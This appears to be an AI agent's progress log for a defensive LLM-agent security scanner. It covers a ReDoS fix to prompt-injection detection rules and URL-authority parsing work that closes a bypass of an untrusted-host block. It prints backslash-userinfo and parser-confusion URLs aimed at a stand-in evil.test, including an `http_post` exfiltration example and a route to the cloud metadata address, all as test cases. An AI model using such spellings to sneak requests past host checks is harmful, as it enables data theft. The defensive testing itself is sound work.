# fix/l1-superlinear — four super-linear L1 rules + the audit gap that passed them

## Summary

Four L1 rules backtracked super-linearly on a shape the ReDoS audit never built:
the rule's own leading phrase followed by a long run of whitespace and nothing
else. That gets the engine into the pattern's ambiguous middle (consecutive
`\s*`/`\s+`/optional-group/`[:\s]+` quantifiers), where one whitespace run is
partitioned many ways while the trailing required token never arrives.

The four rules: `LLM01_persona_expanded`, `LPCI_S6_split_payload`,
`LLM01_fake_authority_marker`, `LLM01_decode_execute_expanded`.

## 1. Failing test first (the audit gap)

Added to `tests/test_redos_pattern_audit.py` (section 7):

- `test_every_rule_bounded_on_its_own_trigger_then_whitespace` — generates the
  seed **per rule, from its own compiled pattern** (walks the parse tree, emits
  the longest letters-and-single-spaces prefix, stops at the mouth of the
  ambiguous middle), appends a whitespace run, asserts a per-pattern ceiling.
  Sweeps **every** rule in `ALL_RULES`, so a rule the maintainer forgets cannot
  dodge it.
- `test_generated_trigger_growth_is_not_superlinear` — the **growth-ratio** gate
  applied on the same generated shape, 4× step, over every rule.

**Second defect in the gate, named.** The pre-existing
`test_growth_is_not_superlinear` stayed green on all four for two independent
reasons: (a) it is parametrized over a hand-maintained `GROWTH_RULES` list none
of the four is on, and (b) it only measures the fixed `battery()` shapes, which
never include this shape. It reported coverage it was not performing. The new
growth test depends on neither a list nor a fixed battery.

### Red, against the pre-fix patterns (committed HEAD), `PYTHONDONTWRITEBYTECODE=1`

Both new gates went red (`2 failed`) and each named all four rules: the
per-pattern ceiling and the growth ratio. The raw failure output is not
reproduced here because it prints each rule's generated seed beside its timing.
To regenerate it, run the two tests above against the pre-fix
`xaidr/rules/all-l1-rules.json`.

(This red *is* the sabotage/restore proof required by RULES: the pre-fix HEAD
carries the old patterns, and the new audit shape reddens against them.)

## 2. The fix — bounded, non-overlapping constructions

The root cause in each is **adjacent whitespace-eating quantifiers** that split
one whitespace run many ways. Each fix collapses them into a single bounded,
non-overlapping class (counting-style bound, the same posture as the repetition
detector that replaced the hanging phrase-repeat regex):

- `fake_authority`: `\s*:?\s*` → `[\s:]{0,8}`
- `LPCI_S6`: `\s*(?:of\s+\d+)?[:\s]+` → `(?:\s+of\s+\d+)?[:\s]{1,8}` (killed the
  unbounded `[:\s]+` and the standalone `\s*` in front of it)
- `persona`: the stacked `(?:a )?(?:AI)?\s*(?:called)?\s*\w+` middle → one bounded
  `[^\n]{0,80}?`
- `decode`: `\s+(?:it)?\s*[:.]?\s*` → `(?:\s+it)?[\s:.]{0,8}`

~~Each `_why_changed` in the rule JSON records the specific defect and bound.~~
**No longer true (2026-10-08):** the rule JSON carries no annotation fields.
They were removed from every rule asset and `tests/test_rule_asset_annotations.py`
now refuses any `_`-prefixed key there. The records are in git history.

### Green, after the fix

```
tests/test_redos_pattern_audit.py  47 passed in 8.69s      # 45 + 2 new
tests/test_agentic_abuse_l1.py tests/test_tool_arg_agentic_categories.py
                                   82 passed in 0.11s
```

## 3. Sweep of all 224 patterns on the new shape

Pre-fix: exactly the four exceeded the 50 ms bar, and no others. Post-fix:
**0 rules over 50 ms**.

## 4. Detection must not regress — rules-only, before vs after

| corpus | before | after |
|---|---|---|
| heldout | 16/50 catch, 6/50 FP | **16/50, 6/50** (identical) |
| asi_battery | (table) | **identical before/after** |
| benign_a2a | 0/60 FP | 0/60 FP |
| benign_toolcall | 0/190 FP | 0/190 FP |
| benign_longform | oversized-only | **identical** |

No recall loss, no new false positive.

## 5. The 0.5 s scan budget does NOT bound a single rule (confirmed, not fixed here)

`xaidr/scanner/l1.py::scan_l1`: `_L1_SCAN_BUDGET_SEC` (0.5 s) is checked at the
**top** of the loop, before each rule; `_L1_RULE_SLOW_SEC` (1.0 s) is checked
**after** the rule returns. Between those two checks the rule's `re.search`/
detector runs to completion — and the file itself states a C-level `re.search`
is uninterruptible in CPython. So the budget bounds *how many rules are entered*,
not the time any one rule spends, and the guards only **record** a slow rule
afterward. This is the guard that looks like protection.

Not fixed on this branch: it is not a one-line change (needs a timeout-capable
engine such as the `regex` module, or process/thread isolation). Reported per the
goal. The real fix is the one applied above — make every pattern linear — which
is what the file's own comment says the budget can never substitute for.

---

# A2 — value-origin seam wiring: PROGRESS

Evidence goes here as the build runs, and failures are reported as failures.
Plan: `ARCHITECTURE.md`; brief: `BRIEF.md`; rulings: `docs/value-origin-rulings.md`.

How every run below was made, unless a line says otherwise:

- **macOS** (Darwin 25.6), CPython 3.12.2, in a scratch venv carrying pytest,
  httpx 0.28.1, urllib3 2.8.0, ada-url 4.0.0 and hatchling. The run uses
  `PYTHONPATH=<worktree>`, and `xaidr.__file__` was confirmed to be the worktree
  (memory: xaidr-worktree-venv-shadowing). The shared `.venv` was not used for
  these runs.
- **Linux:** `python:3.10-slim` (CPython 3.10.21) and `python:3.12-slim`
  (3.12.14). Each container copies the tree and runs `pip install '.[dev]'`.
- **Affected tests only.** The full suite was never run.

---

## M0 — finding 1, the backslash-userinfo authorization bypass (Q1). **Green. STOP AND REPORT.**

**STOP 2 / the owner's M0 STOP:** ENFORCE (M8) does not start until the owner
has seen this. The build continues with C-11 (M1), which does not depend on it.

**Commits.**
- Plan: `2f93115` (ARCHITECTURE.md).
- **M0 core change: `77ee2f8eea0c82804b403d180bc754e14af4b30d`, the new pin
  for paid**, in its own commit, as instructed. It is SEMANTIC:
  `expected.jsonl` moved, so paid's re-vendor bumps `EVALUATOR_GENERATION`
  (P4). It is not on `main`, so `vendor_value_origin.py`'s ancestry check
  refuses it until it is merged. Merging is the owner's call.
- Evidence: the commit after this one.

**The defect.** With `evil.test` recorded untrusted,
`http_post(url="https://corp.example\@evil.test/collect")` came back
**`principal`, AUTHORIZED, not blocked under ENFORCE**. The core read only the
WHATWG split (backslash is a slash: `corp.example`); httpx sends the request
to `evil.test`, and `urllib.parse` reads `evil.test` as its host. (Corrected at
review: an earlier draft said "httpx and urllib send". `urllib.request` passes
the netloc on (percent-DECODED, userinfo included; *M2 review: "raw" was false, it decodes `%31%36%39…` and reaches 169.254.169.254*) and reaches neither host.) This is the 1.15.0 userinfo bypass shape in new code.

**The fix (Q1, amends V-23).** Every reading of the authority split that a real
consumer performs is a finding, and the weakest decides. That is R1's shape.
In `xaidr/value_origin/_authority.py`:

- **WHATWG reading:** via `urlsplit`, as before.
- **RFC 3986 reading:** urllib.parse and httpx, computed on the value as
  written.
- **Refused WHATWG string:** where `urlsplit` refuses it, the value stays
  `parse_failure` (decision 7), and the WHATWG host the split still finds is
  added beside it.

The RFC and refusal readings use a written-out split, because `urlsplit`
differs across CPython patch releases (V-4).

### Failing test first — the red, before any core change

The conformance rows (`supplementary.jsonl`, through `convert.py`, so
`expected.jsonl` and SOURCE.json were regenerated, not hand-edited), the
ENFORCE pins, the result-side test, and the multi-oracle differential, all run
against the unfixed core:

```
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[V23-backslash]
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[Q1-backslash-userinfo-bypass]
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[Q1-backslash-userinfo-mirror]
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[Q1-backslash-nonspecial-scheme]
FAILED tests/value_origin_conformance/test_core.py::test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-nonspecial-scheme]
FAILED tests/value_origin_conformance/test_core.py::test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-userinfo-bypass]
FAILED tests/value_origin_conformance/test_core.py::test_q1_a_poisoned_result_records_every_reading_of_its_url
FAILED tests/value_origin_conformance/test_authority.py::test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys0]
FAILED tests/value_origin_conformance/test_authority.py::test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys1]
FAILED tests/value_origin_conformance/test_authority.py::test_q1_every_reading_of_the_authority_split_is_a_finding[value_37chars-keys2]
FAILED tests/value_origin_conformance/test_authority.py::test_q1_authority_of_answers_none_for_a_value_with_two_authorities
11 failed, 9 passed, 137 deselected in 0.07s

E  AssertionError: Q1-backslash-userinfo-bypass: should_block under ENFORCE is False (wire principal), Q1 says True —
   a call httpx/urllib send to an UNTRUSTED host walked through because the core read only the other side of the backslash
   [M2 note: this pasted message's "httpx/urllib send" was false when it ran. urllib.request reaches
    neither host; the test message was corrected at the M0 review. Kept verbatim because it is a pasted red.]
E  AssertionError: 3703 readings name a host the core never reads ({'urllib.parse': 1705, 'httpx': 1674, 'ada-url (WHATWG)': 324}):
   a call the transport sends there is invisible to value origin, and under ENFORCE an untrusted host walks through.
   First five: 'http://corp.example\\@evil.test' urllib.parse reads dns:evil.test, core reads ['dns:corp.example']; ...
FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
```

### Two more defects found while proving it, each red first

1. **V-4: `urlsplit` is not the same function on every interpreter.** The first
   fix computed the RFC reading with `urlsplit`. In the Linux containers that
   gave 336 under-reads (httpx 288, ada 48), for example
   `http://[::1]\@evil.test`. Its bracketed-host validation, a security
   backport, raises there on 3.10.21 and 3.12.14 and returns `evil.test` on
   3.12.2, while httpx sends it to `evil.test` everywhere. Fixed with a
   written-out split. The pin, red with the `urlsplit` version on Linux:
   ```
   == previous RFC split, py3.10
   FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://[::1]\\@evil.test/x-keys6]
   FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
   == previous RFC split, py3.12   (same two)
   ```
2. **A sibling of finding 1, found by the adversarial corpus.**
   `http://&a:foo(b]c@d:2/` from WPT goes to `d` through httpx, urllib3 and
   WHATWG. `urlsplit` refuses it, so the core read nothing (`parse_failure`
   alone never blocks). Spellings of that shape were added to the grid first:
   ```
   E  AssertionError: 6993 readings name a host the core never reads ({'httpx': 864, 'urllib3': 945, 'ada-url (WHATWG)': 5184})
   ```
   The new pins were red against the previous fix:
   ```
   FAILED ...test_supplementary_case[Q1-urlsplit-refusal]
   FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-urlsplit-refusal]
   FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://&a:foo(b]c@d:2/-keys7]
   FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
   4 failed, 232 passed, 7 xfailed
   ```
3. **Over-reads.** These were caught by the over-read gate after the
   silent-failure review asked for `[` mid-host spellings:
   - 3,150 over-reads from reading past a mid-host `[` (`http:ev[il].test` read
     as `il`);
   - then 42 under-reads on 3.12.2, where `urlsplit` does read `il` from
     `http://[::1]\@ev[il].test`;
   - then 1,575 over-reads of bracketed non-IPv6 hosts (`http:[evil.test]`).

   **Then the milestone review.** The over-read class's stated reason was
   false ("an older `urllib.request` sends there"), and on macOS the class was
   absorbing 1,092 over-reads that even 3.12.2 refuses. Resolved by making the
   RFC reading reproduce **exactly** CPython 3.12.2's `urlsplit` checks and host
   rule, the most permissive version measured. The WHATWG fallback uses
   WHATWG's rule: a `[` must open the host and enclose IPv6. The class is now
   pinned both ways:
   - it absorbs **0** on 3.12.2, because urllib.parse there reads every host the
     core reads;
   - it absorbs **115** on 3.10.21 and 3.12.14, which refuse them.

### Green — the final code, three interpreters

The affected suites are `tests/value_origin_conformance/`,
`tests/test_differential_oracles.py`, `tests/test_differential_parsers.py`,
`tests/test_url_classes.py` and `tests/outside/`:

```
== macOS 3.12.2
499 passed, 12 xfailed in 21.01s
== linux 3.10
499 passed, 12 xfailed in 15.02s
== linux 3.12
499 passed, 12 xfailed in 10.93s
```

Counts on the committed differential corpus
(`scratchpad/count_grid.py`):

```
pre-fix core (base 25dc9de), macOS:  spellings=47124 under_reads=10780 {'urllib.parse': 1789, 'httpx': 2538, 'urllib3': 945, 'ada-url (WHATWG)': 5508}
M0 core, macOS py3.12.2:             spellings=47124 under_reads=0  over_reads_absorbed_by_named_class=0    unnamed_over_reads=0
M0 core, linux py3.10.21:            spellings=47124 under_reads=0  over_reads_absorbed_by_named_class=115  unnamed_over_reads=0
M0 core, linux py3.12.14:            spellings=47124 under_reads=0  over_reads_absorbed_by_named_class=115  unnamed_over_reads=0
```

The 12 xfails are strict. There are 11 pre-existing ones, plus
`test_residual_empty_hex_part_is_the_zero_address`, found below. On Linux the
`dev` extra installs on both 3.10 and 3.12, so nothing skips.

### Sabotage proof, on the final code, both directions

Run on the commit candidate. Every Q1 reading is removed (`others = []` in
`url_authority`):

```
=== SABOTAGE on final M0 code: every Q1 reading removed — new gates
E  AssertionError: 10780 readings name a host the core never reads ({'urllib.parse': 1789, 'httpx': 2538, 'urllib3': 945, 'ada-url (WHATWG)': 5508}): ...
FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
FAILED ...test_supplementary_case[V23-backslash]
FAILED ...test_supplementary_case[Q1-backslash-userinfo-bypass]
FAILED ...test_supplementary_case[Q1-backslash-userinfo-mirror]
FAILED ...test_supplementary_case[Q1-backslash-nonspecial-scheme]
FAILED ...test_supplementary_case[Q1-urlsplit-refusal]
FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-nonspecial-scheme]
FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-userinfo-bypass]
FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-urlsplit-refusal]
FAILED ...test_q1_a_poisoned_result_records_every_reading_of_its_url
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys0]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys1]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[value_37chars-keys2]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://[::1]\\@evil.test/x-keys6]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://&a:foo(b]c@d:2/-keys7]
FAILED ...test_q1_authority_of_answers_none_for_a_value_with_two_authorities
16 failed, 221 passed, 8 xfailed
=== same sabotage — the gates that existed before M0 (must stay green)
128 passed, 4 xfailed
=== RESTORED (byte-identical)
237 passed, 8 xfailed
```

**The discriminating half.** Under the same sabotage, the gates that existed
before M0 stay green, which is why they never saw finding 1:

- `test_v19_every_spelling_resolves_to_the_host_urllib_parse_finds`, with one
  oracle and an already-normalised URL fed to it;
- `tests/test_differential_parsers.py`;
- `tests/test_url_classes.py`.

### Outside the process: built wheel, fresh venv, `python -I`, base against HEAD

`tests/outside/harness.py` imports no `xaidr`. The driver refuses unless
`xaidr` comes from the venv's site-packages. httpx was installed in each venv
to show where the transport sends the same string.

```
=== base: wheel from git archive 25dc9de (A1 merge)
  xaidr from out-base/venv/lib/python3.12/site-packages/xaidr/__init__.py | py 3.12.2
  benign-one-authority   wire=principal          blocks_under_ENFORCE=False findings=['dns:corp.example']  httpx_sends_to=docs.corp.example
  bypass                 wire=principal          blocks_under_ENFORCE=False findings=['dns:corp.example']  httpx_sends_to=evil.test
  mirror                 wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test']  httpx_sends_to=corp.example
  plain-untrusted        wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test']  httpx_sends_to=evil.test
=== head: wheel from the M0 working tree
  xaidr from out-head/venv/lib/python3.12/site-packages/xaidr/__init__.py | py 3.12.2
  benign-one-authority   wire=principal          blocks_under_ENFORCE=False findings=['dns:corp.example']  httpx_sends_to=docs.corp.example
  bypass                 wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:corp.example', 'dns:evil.test']  httpx_sends_to=evil.test
  mirror                 wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test', 'dns:corp.example']  httpx_sends_to=corp.example
  plain-untrusted        wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test']  httpx_sends_to=evil.test
```

`tests/outside/test_m0_reading_set_from_the_wheel.py` asserts the HEAD half in
CI's `full` config. The base half is one-off evidence: CI checks out with depth
1, so the base commit is not there to build.

**Scope of "end to end".** No sensor seam is wired yet, so the end-to-end path
in M0 is the core's public interface, which paid vendors, exercised from the
installed wheel. The same flow through `Sensor.scan_tool_call` becomes
observable at M4. It is deferred by construction, not skipped.

### Adversarial verification: a corpus the build never saw

The corpus is web-platform-tests `url/resources/urltestdata.json` at
`c48d58747e1f211527fb695fd60548a997fae617` (sha256 `81e85fd3…f652`,
BSD-3-Clause). It was fetched to the scratchpad and not vendored; vendoring
comes with M2 (Q19). It ran through the same four oracles, 696 absolute inputs.
Every remaining under-read falls in a named class, and **none is a split
defect**:

```
WPT under-reads after M0, by class (oracle readings):
    71  whitespace/control: known residual (strict xfail)   e.g. 'http://example\t.\norg'
    66  file:/data: ruled never a destination (decision 6)   e.g. 'file://example:1/'
    49  relative / scheme-less reference: not a sendable URL (V-19)   e.g. '//foo/bar'
     9  mailto:// authority: not a fetchable scheme   e.g. 'mailto://example.com:8080/pathname?search#hash'
     2  empty-hex IP part: new strict xfail (integer family)   e.g. 'https://0x.0x.0'
```

### Q3: refuse, never skip

The `base` install has no dev extra:

```
--- base install, oracle tests run directly (must REFUSE, not skip):
      6 errors
      3 REFUSING: hatchling (dev extra) is not installed, so no wheel can be built ...
      3 REFUSING: oracle(s) ['httpx', 'urllib3', 'ada-url'] are not installed, so this differential cannot compare ...
--- base install, as CI base runs them (explicit deselect):
364 passed, 1 skipped, 6 deselected, 8 xfailed
```

The one skip is the existing `test_built_wheel` (no hatchling in `base`). It
predates A2, and the new tests do not repeat its pattern.

### Found, not fixed (strict xfail, pasted red on adoption)

- **Empty hex part.** `https://0x.0x.0/` is 0.0.0.0 to WHATWG (ada) and to the
  macOS libc resolver that httpx and urllib3 hand the name to. glibc does not
  read it that way. The core reads `dns:0x.0`, because `int("0x", 16)` raises in
  `coerce_ip`. This is IP canonicalisation in the integer family, and it is
  fixed where `coerce_ip` is shared (M3). It is not a Q1 split question.

### Decisions this milestone made that need the owner's ruling

All are recorded in `docs/value-origin-rulings.md`, under "Decisions made in
the A2 build (M0)":

1. The RFC 3986 reading is a written-out split that reproduces CPython 3.12.2's
   `urlsplit`, not this interpreter's `urlsplit` (V-4, measured). The WHATWG
   fallback uses WHATWG's bracket rule.
2. A value `urlsplit` refuses stays `parse_failure` and carries the hosts the
   other readings find. That is Q1 applied to a refusal, found by WPT.
3. `authority_of` returns `None` for a value with two authorities, as for a
   two-mailbox list.
4. Over-read class `urlsplit-bracket-validation`: hosts 3.12.2's
   urllib.parse reads and later patch releases refuse. It absorbs 0 on 3.12.2
   and 115 on 3.10.21 / 3.12.14, and is pinned both ways.

### What changed outside `xaidr/value_origin/`

- `pyproject.toml`: the `dev` extra gains `httpx`, `urllib3` and `ada-url`.
  These are test oracles, not runtime dependencies (Q3).
- `.github/workflows/ci.yml`: `base` runs `-m "not requires_dev_extra"`;
  `full` runs everything.
- `tests/conftest.py`: registers the `requires_dev_extra` marker.
- `expected.jsonl` changed, which is **semantic** for paid (§4.5, P4):
  - +5 rows: `Q1-backslash-userinfo-bypass`, `-mirror`,
    `-nonspecial-scheme`, `-readings-agree`, `Q1-urlsplit-refusal`;
  - `V23-backslash`'s findings gained `dns:corp.example` (principal). Its wire
    is still `unresolved`.
  - Paid's re-vendor must bump `EVALUATOR_GENERATION`.

### Fresh-context reviews

- **silent-failure-hunter.** No swallowed exception or empty-default fallback
  in the diff. Everything it ran was confirmed: the merge, the refuse
  behaviour, the outside harness, and the regenerated data, which only adds
  findings. It flagged one corpus gap: a `[` mid-host was never generated. That
  is now in the grid, and it exposed the over-read and under-read pair above,
  now fixed. Its specific example `https://user@corp.ex[ample]:8080/x` is read
  as `ample` by the RFC reading, and every current `urlsplit` refuses it, so it
  falls in the named class.
- **milestone-reviewer.** Five of six claims held. It ran the HEAD and fixed
  cores side by side, the refusal, the outside driver's refusal and the
  `convert.py` byte-identity. It found:
  1. **False:** "httpx and urllib send it to evil.test". urllib.request
     passes the netloc on, percent-decoded (*M2 review: not "raw"*); only urllib.parse reads evil.test. **Retracted in
     place** in `docs/value-origin-rulings.md` and the ARCHITECTURE.md F1 row
     and §2.3, and corrected in every test message, docstring and conformance
     rule text that said it. The grep comes back clean.
  2. **Not reproducible:** "3,703 under-reads across 31,752 spellings" came
     from the first grid. The committed corpus is 47,124 spellings, with 10,780
     under-reads pre-fix (pasted above). Retracted in place.
  3. **Wrong:** decision 4's "31 spellings, Linux only", and its reason. Fixed
     as above. The reviewer's own "macOS absorbs none" was also not what I
     measured: 1,092 then, 0 now.
  4. **Stale:** the rulings doc predated the bracket-rule change. Updated.

  The reviewer also noted the tree changed while it was reviewing. Every number
  in this file comes from the final commit candidate (`_authority.py`
  re-checked after the last edit).

---

## M1 — the C-11 gate, "RECORD never changes an action". **Green. STOP AND REPORT (BRIEF: before any seam wiring).**

**What was built.**
- `tests/test_value_origin_c11.py`: OFF against RECORD in `block` and
  `monitor` enforcement.
- `tests/outside/drivers/c11_oracle.py`: the passes as one module. The
  in-tree gate imports it, and it runs as a driver against built wheels, with
  `--base` for a wheel that predates the parameter and `--compare` for the
  cross-commit table.
- `tests/outside/test_m1_c11_from_the_wheel.py`: C-11 and the construction
  checks asserted in the built wheel (CI `full`).
- **Inert, loudly validated** `Sensor(value_origin="record",
  value_origin_sources=())` (V-34). Nothing reads either parameter yet. ENFORCE
  logs exactly ONE warning, saying what is true: value origin is **NOT YET
  WIRED**, so `enforce` changes no action today, and, with no designations,
  every destination a tool result names will be blocked once it enforces
  (C-11). Default, OFF and RECORD log nothing.

**The passes.** Main corpus, the 456 shell rows:

| pass | what it drives |
|---|---|
| P-input | byte-for-byte the existing oracle, computed by its own `_digest` |
| P-flow-I | T as principal input, then the calls built from T |
| P-flow-R | a neutral input, T as a tool result, then the calls |
| P-seam | T as a `protect_tools`-wrapped tool's return value |
| P-fault | circuit-open, gate, bounds fail-closed, scan-error and not-scannable exits, each one's marker counted |

The §3.3 adversarial corpora, which the gate was not built on:

| pass | what it drives |
|---|---|
| A-flow-I | heldout 100 prompts plus asi_battery 128 text rows, as principal input |
| A-flow-R | the same 228 texts as tool results |
| A-calls | benign_toolcalls 410 calls plus asi_battery 60 tool rows, arguments verbatim |
| A-steps | asi_battery's 52 multi-turn rows, 105 steps, replayed in one flow each |

Every one of asi_battery's 240 rows is driven by exactly one pass.

**What P-seam does NOT cover yet (corrected after the M1 review).**
`protect_tools` has no result position (ARCHITECTURE.md §1.2), so at M1 P-seam
covers **no** result seam: its digest is the same whatever the tool returns. M7
gives `protect_tools` its result position and adds the `langchain_core` and MCP
after-hooks. That is now written into M7's build list, not only here.

### Failing first

Before the constructor change:

```
16 failed, 5 xfailed in 0.30s
E   TypeError: DelphiSensor.__init__() got an unexpected keyword argument 'value_origin'   (x15)
```

The strict xfails had "passed" on that TypeError, which is the wrong reason.
All of them are now `raises=AssertionError`.

### Honest reds on the way (each corrected where it was asserted)

- **The call denominator** was first written as `>= 39`, from a scratch script.
  `calls_for()` gives `{'run_command': 456, 'http_post': 36, 'send_email': 2}`,
  now pinned exactly. ARCHITECTURE.md §3.2 is retracted in place.
- **asi_battery** was assumed to have 56 tool rows per file. That was the count
  WITHOUT `text`. It actually has three shapes: 64 text, 30 tool and 26
  multi-turn rows. The loader crashed (`KeyError: 'text'`) and then counted
  470 against a pinned 522. Both counts are now measured and pinned, and the
  multi-turn rows got their own pass instead of being skipped.

### Green: four interpreters

The suites are C-11, the 456-row oracle, `tests/outside/`, the conformance
suite and the multi-oracle differential:

```
== macOS 3.12.2      425 passed, 14 xfailed, 1 warning
== linux 3.10        425 passed, 14 xfailed
== linux 3.11        425 passed, 14 xfailed
== linux 3.12        425 passed, 14 xfailed
```

The one macOS warning did not recur when re-run with `-W
error::pytest.PytestWarning` (`425 passed, 14 xfailed`). It is recorded as
observed once, not reproduced.

The C-11 strict xfails (6 of the 14; the rest are the core's pre-existing
strict xfails) state the gate's vacuity:

```
XFAIL test_4a_I_..._input_derived_calls                      - not wired: RECORD records no input until M6
XFAIL test_4a_R_..._result_derived_calls[P-flow-R]            - not wired: RECORD records no tool result until M7
XFAIL test_4a_R_..._result_derived_calls[P-seam]              - not wired: RECORD records no tool result until M7
XFAIL test_4b_enforce_moves_an_action_...[P-flow-I|P-flow-R|P-seam] - not wired: nothing can block until M8
```

4a-R is one assertion per pass, because the public `scan(tool_result)` alone
would flip a pooled count at M7 (the M1 review).

### Sabotage, on the final code

```
=== SABOTAGE A: inert RECORD appends a rule on the INPUT path
FAILED ...test_record_moves_no_verdict_score_or_rule[P-input-block]
FAILED ...test_record_moves_no_verdict_score_or_rule[P-input-monitor]
FAILED ...test_record_moves_no_action_on_the_adversarial_corpora[A-steps-block]
FAILED ...test_record_moves_no_action_on_the_adversarial_corpora[A-steps-monitor]
4 failed, 15 passed, 16 deselected
--- existing 456-row oracle (must stay green):
4 passed
=== SABOTAGE B: inert RECORD flags allowed TOOL CALLS
FAILED ...[P-flow-I-block] [P-flow-I-monitor] [P-flow-R-block] [P-flow-R-monitor]
FAILED ...[P-seam-block] [P-seam-monitor] [P-fault-block] [P-fault-monitor]
FAILED ...adversarial_corpora[A-flow-I-block] [A-flow-I-monitor] [A-flow-R-block] [A-flow-R-monitor]
FAILED ...adversarial_corpora[A-calls-block] [A-calls-monitor] [A-steps-block] [A-steps-monitor]
16 failed, 3 passed, 16 deselected
--- existing 456-row oracle (must stay green):
4 passed
=== SABOTAGE C: the warning fires on EVERY construction (the M1 reviewer's probe)
FAILED ...test_construction_warns_only_for_enforce_and_says_what_is_true[kwargs0-0]
FAILED ...test_construction_warns_only_for_enforce_and_says_what_is_true[kwargs1-0]
FAILED ...test_construction_warns_only_for_enforce_and_says_what_is_true[kwargs2-0]
3 failed, 2 passed, 30 deselected
=== RESTORED (byte-identical)
33 passed, 6 xfailed
```

- **The discriminating half of A and B:** the existing oracle stays green. It
  never calls `scan_tool_call` (F4), and both of its sensors run the default
  mode, so a RECORD regression moves them equally.
- **Sabotage C** is the gap the milestone reviewer demonstrated: the first
  version of the warning test stayed green under it. It is now red.

### Outside the process, across commits

See the next section: it is run on the COMMITTED M1 tree, so the evidence
names a SHA.

### Fresh-context reviews

- **silent-failure-hunter:** nothing silent found. It ran checks rather than
  reading code:
  - the strict xfails fail for the right reason (`--runxfail`);
  - the call count;
  - the raise order is preserved;
  - `protect()` forwards the new keywords, because its accepted set comes from
    `inspect.signature`;
  - there is no state leak in either file order, alongside the conformance and
    `protect` suites;
  - the breaker really stays open;
  - the driver's refusals return non-zero.
- **milestone-reviewer:** it reproduced every central claim: P-input equals
  the real `_digest`, failing first, both sabotages, and identical
  cross-commit digests. It found the following, all fixed and re-verified
  above:
  1. the warning had no must-stay-quiet test, and its text claimed blocking
     while inert;
  2. P-input was compared against a hand copy of the oracle, not the oracle's
     own function;
  3. 4a-R was pooled;
  4. the P-seam deferral was understated, and absent from M7's build list;
  5. a nonexistent `scripts/c11_oracle.py` was named in the plan;
  6. the §3.3 adversarial re-run was silently dropped;
  7. the outside "`enforec` raises" check was missing;
  8. the cross-commit table came from an uncommitted tree and a scratchpad
     script;
  9. PROGRESS.md said C-11 runs in "the full config only". The in-tree gate
     has no marker, so it runs in BOTH configs, about 15 to 25 s per Python;
     only the outside test is `full`-only.

### What C-11 does NOT yet prove

Nothing is wired, so **RECORD ≡ OFF holds because RECORD does nothing yet**.
The six strict xfails say so. What M1 establishes is:
1. the instrument, with every pass and every fault path reached;
2. the baseline, identical across commits from the built wheel;
3. that the gate catches a RECORD regression on the input path, on the tool
   path, across turns, and on corpora it was not built on, none of which the
   existing oracle can see.

### CI

CI did not run. It triggers on `pull_request` and on pushes to `main`, the
instruction is to push the branch only, and no PR was opened.

### M1 outside the process, across commits, pinned to SHAs

Wheels were built from `git archive 25dc9de` (base) and `git archive a4df0e6`
(the M1 commit), each in a fresh venv, using the committed harness and driver:

```
$ git archive a4df0e6 | tar -x -C m1-tree    # and base-tree from git archive 25dc9de
$ python -I m1-tree/tests/outside/harness.py base-tree c11-base c11_oracle.py -- --base > c11_base.json
  exit 0
$ python -I m1-tree/tests/outside/harness.py m1-tree c11-head c11_oracle.py > c11_head.json
  exit 0
$ python m1-tree/tests/outside/drivers/c11_oracle.py --compare c11_base.json c11_head.json
base xaidr: c11-base/venv/lib/python3.12/site-packages/xaidr/__init__.py | py 3.12.2
head xaidr: c11-head/venv/lib/python3.12/site-packages/xaidr/__init__.py | py 3.12.2
  block   A-calls    base=da99beb148b8 off=da99beb148b8 record=da99beb148b8 enforce=da99beb148b8  IDENTICAL
  block   A-flow-I   base=b8088580c868 off=b8088580c868 record=b8088580c868 enforce=b8088580c868  IDENTICAL
  block   A-flow-R   base=e30d17b1bbbc off=e30d17b1bbbc record=e30d17b1bbbc enforce=e30d17b1bbbc  IDENTICAL
  block   A-steps    base=bb062c8e336d off=bb062c8e336d record=bb062c8e336d enforce=bb062c8e336d  IDENTICAL
  block   P-fault    base=0cab68adc932 off=0cab68adc932 record=0cab68adc932 enforce=0cab68adc932  IDENTICAL
  block   P-flow-I   base=0d89307249ea off=0d89307249ea record=0d89307249ea enforce=0d89307249ea  IDENTICAL
  block   P-flow-R   base=bc8f93094a59 off=bc8f93094a59 record=bc8f93094a59 enforce=bc8f93094a59  IDENTICAL
  block   P-input    base=80f31ff0b5d5 off=80f31ff0b5d5 record=80f31ff0b5d5 enforce=80f31ff0b5d5  IDENTICAL
  block   P-seam     base=c0c7b885462b off=c0c7b885462b record=c0c7b885462b enforce=c0c7b885462b  IDENTICAL
  monitor A-calls    base=bc96eee1be21 off=bc96eee1be21 record=bc96eee1be21 enforce=bc96eee1be21  IDENTICAL
  monitor A-flow-I   base=b8088580c868 off=b8088580c868 record=b8088580c868 enforce=b8088580c868  IDENTICAL
